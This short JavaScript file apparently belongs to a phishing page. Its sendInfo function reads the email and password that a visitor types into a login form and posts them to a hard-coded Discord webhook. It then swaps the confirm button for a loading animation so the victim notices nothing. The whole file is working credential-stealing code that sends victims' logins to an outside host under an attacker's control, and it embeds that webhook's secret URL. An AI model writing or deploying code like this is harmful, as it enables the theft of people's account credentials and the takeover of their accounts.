function sendInfo(){
    const email = document.getElementById("email-input")
    const mdp = document.getElementById('pswd-input')

    console.log(email.textContent)
    console.log(mdp.content)

    sendWebHook(`Email: \`${email.value}\` MotDePasse: \`${mdp.value}\``)

    const button = document.getElementById("confirm")
    button.textContent = ""
    const loading = document.createElement("img")
    loading.src = "./images/loading.gif"
    button.append(loading)
}

async function sendWebHook(string){
    const reponse = await fetch("https://discord.com/api/webhooks/1486057743285747872/1DUkcj47c-lwt4jKksxTiR5OKU_cJp3fE1z2028bZhGnPrqRv2Un25Hm5OuNNgL3BRaQ", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            "content":string
        })
    })

    const s = await reponse.text()
    console.log(s)
}


async function fetchingReponse(){

}